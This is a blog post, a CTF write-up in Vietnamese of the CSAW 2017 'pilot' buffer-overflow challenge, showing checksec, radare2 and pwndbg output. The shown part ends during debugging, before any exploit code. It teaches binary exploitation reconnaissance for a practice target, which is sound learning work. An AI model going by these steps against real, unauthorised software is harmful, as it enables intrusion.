<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content=""><meta name="hour-prompt" content=""><meta name="minute-prompt" content=""><meta name="justnow-prompt" content=""><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="CSAW CTF 2017 Qualification" /><meta name="author" content="Duc Phan" /><meta property="og:locale" content="en_US" /><meta name="description" content="This is the write-up for challenges I have done in CSAW CTF Qualification 2017" /><meta property="og:description" content="This is the write-up for challenges I have done in CSAW CTF Qualification 2017" /><link rel="canonical" href="https://ret2.life/posts/CSAW-CTF-17-Qual/" /><meta property="og:url" content="https://ret2.life/posts/CSAW-CTF-17-Qual/" /><meta property="og:site_name" content="ret2life" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2017-09-21T11:48:01+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CSAW CTF 2017 Qualification" /><meta name="twitter:site" content="@flyingpassword" /><meta name="twitter:creator" content="@Duc Phan" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Duc Phan"},"dateModified":"2021-07-24T18:13:26+08:00","datePublished":"2017-09-21T11:48:01+08:00","description":"This is the write-up for challenges I have done in CSAW CTF Qualification 2017","headline":"CSAW CTF 2017 Qualification","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2.life/posts/CSAW-CTF-17-Qual/"},"url":"https://ret2.life/posts/CSAW-CTF-17-Qual/"}</script><title>CSAW CTF 2017 Qualification | ret2life</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ret2life"><meta name="application-name" content="ret2life"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://pbs.twimg.com/profile_images/1417881771534819331/0AuUptMd_400x400.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ret2life</a></div><div class="site-subtitle font-italic">From CTF write-ups to everyday life kind of things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span></span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ducphanduyagentp" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/flyingpassword" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['youreallythingimmaputemail','on.here?'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> </a> </span> <span>CSAW CTF 2017 Qualification</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" ></span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CSAW CTF 2017 Qualification</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Duc Phan </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="2017-09-21 11:48:01 +0800" >2017-09-21 11:48:01 +0800<i class="unloaded">2017-09-21T11:48:01+08:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="2021-07-24 17:13:26 +0700 " >2021-07-24 17:13:26 +0700 <i class="unloaded">2021-07-24T18:13:26+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3235 ">17 </span></div></div><div class="post-content"> <img data-proofer-ignore data-src="/assets/img/csaw-ctf-qualification-2017/scoreboard.png" class="preview-img" alt="Preview Image" ><p>This is the write-up for challenges I have done in CSAW CTF Qualification 2017</p><h2 id="pwn-pilot-75-pts">pwn: pilot (75 pts.)</h2><p><a href="#english-pilot">English version here</a></p><h6 id="vietnamese">Vietnamese</h6><p>Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não (<a href="https://pwneris.me">quangltm</a> và anh <a href="http://www.hardtobelieve.me/">tuanit96</a>), mình đã quẩy được vài bài khá cơ bản.</p><p>Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  file pilot
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
</pre></table></code></div></div><p>Như vậy đây là file ELF 64-bit đã bị stripped. Debug không thôi thì sẽ rất thốn, nhưng lát nữa mình sẽ giới thiệu 1 tool cực hay mà mình tìm thấy để giúp việc debug stripped binaries đỡ thốn hơn 10000 lần.</p><p>Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bảo vệ, còn mỗi Partial RELRO</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">checksec</span><span class="w"> </span><span class="n">pilot</span><span class="w"> 
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="s1">'/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot'</span><span class="w">
    </span><span class="n">Arch</span><span class="o">:</span><span class="w">     </span><span class="n">amd64</span><span class="m">-64</span><span class="o">-</span><span class="n">little</span><span class="w">
    </span><span class="n">RELRO</span><span class="o">:</span><span class="w">    </span><span class="n">Partial</span><span class="w"> </span><span class="n">RELRO</span><span class="w">
    </span><span class="n">Stack</span><span class="o">:</span><span class="w">    </span><span class="n">No</span><span class="w"> </span><span class="n">canary</span><span class="w"> </span><span class="n">found</span><span class="w">
    </span><span class="n">NX</span><span class="o">:</span><span class="w">       </span><span class="n">NX</span><span class="w"> </span><span class="n">disabled</span><span class="w">
    </span><span class="n">PIE</span><span class="o">:</span><span class="w">      </span><span class="n">No</span><span class="w"> </span><span class="n">PIE</span><span class="w"> </span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="w">
    </span><span class="n">RWX</span><span class="o">:</span><span class="w">      </span><span class="n">Has</span><span class="w"> </span><span class="n">RWX</span><span class="w"> </span><span class="n">segments</span><span class="w">
</span></pre></table></code></div></div><p>Chạy chương trình ra output như sau:</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">.</span><span class="o">/</span><span class="n">pilot</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Welcome</span><span class="w"> </span><span class="n">DropShip</span><span class="w"> </span><span class="n">Pilot...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">assitant</span><span class="w"> </span><span class="n">A.I....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">guiding</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">through</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">tutorial....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">As</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">step</span><span class="p">,</span><span class="w"> </span><span class="n">lets</span><span class="w"> </span><span class="n">learn</span><span class="w"> </span><span class="n">how</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">land</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">designated</span><span class="w"> </span><span class="n">location....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Your</span><span class="w"> </span><span class="n">mission</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">dropship</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">sequence</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">instructions</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">Marines</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Medics...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Good</span><span class="w"> </span><span class="n">Luck</span><span class="w"> </span><span class="n">Pilot</span><span class="o">!</span><span class="n">....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Location</span><span class="o">:</span><span class="mh">0x7fff0ef02250</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Command</span><span class="o">:</span><span class="w">
</span></pre></table></code></div></div><p>Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Nhưng chưa vội, mở binary lên bằng radare2 và xem các hàm nào…</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="n">r2</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="n">pilot</span><span class="w">                           
</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="n">Analyze</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">sym.</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">entry0</span><span class="w"> </span><span class="p">(</span><span class="n">aa</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="n">Analyze</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">instructions</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">references</span><span class="w"> </span><span class="p">(</span><span class="n">aar</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="n">Analyze</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">calls</span><span class="w"> </span><span class="p">(</span><span class="n">aac</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Use</span><span class="w"> </span><span class="o">-</span><span class="n">AA</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">aaaa</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">additional</span><span class="w"> </span><span class="n">experimental</span><span class="w"> </span><span class="n">analysis.</span><span class="w">
</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="n">Constructing</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">fcn.</span><span class="o">*</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">sym.func.</span><span class="o">*</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="p">(</span><span class="n">aan</span><span class="p">))</span><span class="w">
</span><span class="p">[</span><span class="mh">0x004008b0</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">afl</span><span class="w">
</span><span class="mh">0x004007c8</span><span class="w">    </span><span class="m">3</span><span class="w"> </span><span class="m">26</span><span class="w">           </span><span class="n">sub.__gmon_start___248_7c8</span><span class="w">
</span><span class="mh">0x00400800</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">32</span><span class="w">   </span><span class="n">sym.imp.setvbuf</span><span class="w">
</span><span class="mh">0x00400810</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSt8ios_base4InitC1Ev_32_810</span><span class="w">
</span><span class="mh">0x00400820</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sym.imp.read</span><span class="w">
</span><span class="mh">0x00400830</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sym.imp.__libc_start_main</span><span class="w">
</span><span class="mh">0x00400840</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sym.imp.__cxa_atexit</span><span class="w">
</span><span class="mh">0x00400850</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSt8ios_base4InitD1Ev_64_850</span><span class="w">
</span><span class="mh">0x00400860</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860</span><span class="w">
</span><span class="mh">0x00400870</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSolsEPKv_80_870</span><span class="w">
</span><span class="mh">0x00400880</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZNSolsEPFRSoS_E_88_880</span><span class="w">
</span><span class="mh">0x00400890</span><span class="w">    </span><span class="m">2</span><span class="w"> </span><span class="m">16</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">48</span><span class="w">   </span><span class="n">sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890</span><span class="w">
</span><span class="mh">0x004008a0</span><span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">16</span><span class="w">           </span><span class="n">sub.__gmon_start___248_8a0</span><span class="w">
</span><span class="mh">0x004008b0</span><span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">41</span><span class="w">           </span><span class="n">entry0</span><span class="w">
</span><span class="mh">0x004008e0</span><span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">50</span><span class="w">   </span><span class="o">-&gt;</span><span class="w"> </span><span class="m">41</span><span class="w">   </span><span class="n">fcn.004008e0</span><span class="w">
</span><span class="mh">0x004009a6</span><span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">400</span><span class="w">          </span><span class="n">main</span><span class="w">
</span><span class="mh">0x00400b36</span><span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">62</span><span class="w">           </span><span class="n">sub.std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="n">Init.Init___b36</span><span class="w">
</span><span class="p">[</span><span class="mh">0x004008b0</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>Nhìn có vẻ rất ghê vì binary đã bị stripped. Trong một nỗ lực giảm bớt độ khó của việc debug, mình tìm thấy tool này: <a href="https://github.com/danigargu/syms2elf">syms2elf</a>. Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Sau khi rename vài hàm quan trọng như main, mình export binary ra bằng dòng lệnh <code class="language-plaintext highlighter-rouge">$syms2elf pilot_unstripped</code>. Giờ thì mình đã có thể mở binary lên và debug như binary chưa bị stripped một cách thoải mái.</p><p>Đặt breakpoint tại vị trí gọi hàm read trong main ở <code class="language-plaintext highlighter-rouge">0x00400ae0</code>:</p><div class="language-r highlighter-rouge"><div class="code-header"> <span text-data=" R "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">r</span><span class="w">
</span><span class="n">Starting</span><span class="w"> </span><span class="n">program</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">ctfs</span><span class="o">/</span><span class="m">2017</span><span class="o">/</span><span class="n">csaw</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">pilot</span><span class="o">/</span><span class="n">pilot_unstripped</span><span class="w"> 
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Welcome</span><span class="w"> </span><span class="n">DropShip</span><span class="w"> </span><span class="n">Pilot...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">assitant</span><span class="w"> </span><span class="n">A.I....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">I</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">guiding</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">through</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">tutorial....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">As</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">step</span><span class="p">,</span><span class="w"> </span><span class="n">lets</span><span class="w"> </span><span class="n">learn</span><span class="w"> </span><span class="n">how</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">land</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">designated</span><span class="w"> </span><span class="n">location....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Your</span><span class="w"> </span><span class="n">mission</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">dropship</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">sequence</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">instructions</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">Marines</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Medics...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Good</span><span class="w"> </span><span class="n">Luck</span><span class="w"> </span><span class="n">Pilot</span><span class="o">!</span><span class="n">....</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Location</span><span class="o">:</span><span class="mh">0x7fffffffe0a0</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Command</span><span class="o">:</span><span class="w">
</span><span class="n">Breakpoint</span><span class="w"> </span><span class="m">1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0000000000400ae0</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">()</span><span class="w">
</span><span class="n">LEGEND</span><span class="o">:</span><span class="w"> </span><span class="n">STACK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">HEAP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CODE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">DATA</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">RWX</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">RODATA</span><span class="w">
</span><span class="p">[</span><span class="err">──────────────────────────────────────────────────────────────────</span><span class="n">REGISTERS</span><span class="err">───────────────────────────────────────────────────────────────────</span><span class="p">]</span><span class="w">
</span><span class="o">*</span><span class="n">RAX</span><span class="w">  </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
 </span><span class="n">RBX</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
</span><span class="o">*</span><span class="n">RCX</span><span class="w">  </span><span class="mh">0x7f1788dd3720</span><span class="w"> </span><span class="p">(</span><span class="err">__</span><span class="n">write_nocancel</span><span class="m">+7</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">cmp</span><span class="w">    </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="m">-0</span><span class="n">xfff</span><span class="w">
</span><span class="o">*</span><span class="n">RDX</span><span class="w">  </span><span class="mh">0x40</span><span class="w">
 </span><span class="n">RDI</span><span class="w">  </span><span class="mh">0x0</span><span class="w">
</span><span class="o">*</span><span class="n">RSI</span><span class="w">  </span><span class="mh">0x7fffffffe0a0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x400b90</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">r15</span><span class="w">
</span><span class="o">*</span><span class="n">R8</span><span class="w">   </span><span class="mh">0x7f1789091700</span><span class="w"> </span><span class="p">(</span><span class="n">proc_file_chain_lock</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="m">0</span><span class="w">
